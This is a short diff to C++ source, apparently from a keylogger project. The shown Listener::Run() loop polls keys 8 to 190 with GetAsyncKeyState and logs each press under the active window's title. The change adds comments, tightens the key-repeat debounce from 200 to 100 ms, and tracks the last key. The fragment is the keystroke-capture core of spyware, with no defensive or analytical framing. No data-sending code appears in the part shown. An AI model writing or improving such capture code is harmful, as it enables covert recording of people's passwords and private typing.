@@ -37,18 +37,23 @@ void Listener::Run()
 	// Restart Listner timer 
 	this->Timer.restart();
 
+	// Keep looping while Listening is true
 	while (this->IsListening())
 	{
-		for (key = 8; key <= 190; ++key)
+		for (key = 8; key <= 190; ++key) // Note : intializing key at 8 
 		{
 			if (GetAsyncKeyState(key) == -32767) // save keyboard entree
 			{
-				if (key == last_key && this->Timer.getElapsedTime() <= milliseconds(200))
+				// Prevent to add to many times a pressed and holded key
+				if (key == last_key && this->Timer.getElapsedTime() <= milliseconds(100))
 				{
+					last_key = key;
 				}
 				else
 				{
+					// Add key to log under the window name
 					Log->Add(Utilities::GetActiveWindow(), key);
+					last_key = key;
 					this->Timer.restart();
 				}
 			}
